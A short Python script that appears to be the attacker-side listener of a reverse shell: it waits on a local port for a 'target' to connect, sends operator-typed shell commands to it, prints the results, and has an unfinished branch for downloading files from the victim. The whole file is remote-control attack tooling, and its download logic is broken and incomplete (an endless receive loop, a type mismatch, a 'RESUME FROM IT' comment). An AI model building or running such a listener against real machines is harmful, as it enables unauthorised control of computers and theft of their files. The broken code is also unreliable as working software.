import socket as st
from os import system
from sys import exit

def command_injection(cmd:str,client):
    try:
        client.send(cmd.encode())
        getout = client.recv(1024).decode().strip()
    
    except Exception as err:
        return err
    
    return getout


sock = st.socket(st.AF_INET,st.SOCK_STREAM)
sock.setsockopt(st.SOL_SOCKET,st.SO_REUSEADDR,1)
sock.bind(('127.0.0.1',7777))
sock.listen()
con,addr = sock.accept()

# def recv_file()
while con:
    system('clear')
    print('[*] Connection established to the target')

    while True:
        cmd = input('>>>')
        if not cmd:
            continue
        elif 'download' in cmd:
            getfile_size = con.recv(1024)
            chnk_cnt = 0

            while chnk_cnt < getfile_size and not len(getfile_size) <= 0:
                try:
                    file = con.recv(4096)
                    while True:
                        file = con.recv(4096)
                    with open(file,'wb') as f:
                        f.write(file)

                except:
                    pass
            #RESUME FROM IT 

        elif cmd in ('quite','exit'):
            con.close()
            sock.close()
            break
        else:
            con.send(cmd.encode())
            output = con.recv(1168).decode()
            print(output,end='\n',flush=True)
            continue
